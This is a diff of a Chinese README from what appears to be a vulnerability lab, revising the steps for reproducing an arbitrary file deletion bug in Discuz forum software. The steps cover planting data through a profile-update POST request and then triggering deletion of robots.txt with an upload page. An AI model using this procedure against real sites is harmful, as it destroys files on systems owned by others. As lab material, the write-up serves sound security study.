@@ -22,7 +22,11 @@ docker-compose up -d
 
 ![](2.png)
 
-注册用户后，带上自己的Cookie发送如下数据包：
+注册用户后，在个人设置页面找到自己的formhash：
+
+![](4.png)
+
+带上自己的Cookie、formhash发送如下数据包：
 
 ```
 POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
@@ -41,7 +45,7 @@ Connection: close
 ------WebKitFormBoundaryPFvXyxL45f34L12s
 Content-Disposition: form-data; name="formhash"
 
-60e7e10b
+[your formhash]
 ------WebKitFormBoundaryPFvXyxL45f34L12s
 Content-Disposition: form-data; name="birthprovince"
 
@@ -54,15 +58,13 @@ Content-Disposition: form-data; name="profilesubmit"
 
 ```
 
-其中formhash可以在页面中查找获得。
-
-![](4.png)
-
-提交成功之后用户资料修改页面上的出生地就会显示成下图所示的状态。
+提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：
 
 ![](5.png)
 
-此时，新建一个`upload.html`，代码如下，将其中的`[your-ip]`改成discuz的域名，`[form-hash]`改成你的formhash：
+说明我们的脏数据已经进入数据库了。
+
+然后，新建一个`upload.html`，代码如下，将其中的`[your-ip]`改成discuz的域名，`[form-hash]`改成你的formhash：
 
 ```
 <body>
@@ -73,6 +75,8 @@ Content-Disposition: form-data; name="profilesubmit"
 </body>
 ```
 
-然后用浏览器打开，选择一个正常图片，点击提交。再次访问`http://your-ip/robots.txt`，发现文件成功被删除：
+用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。
+
+再次访问`http://your-ip/robots.txt`，发现文件成功被删除：
 
 ![](6.png)
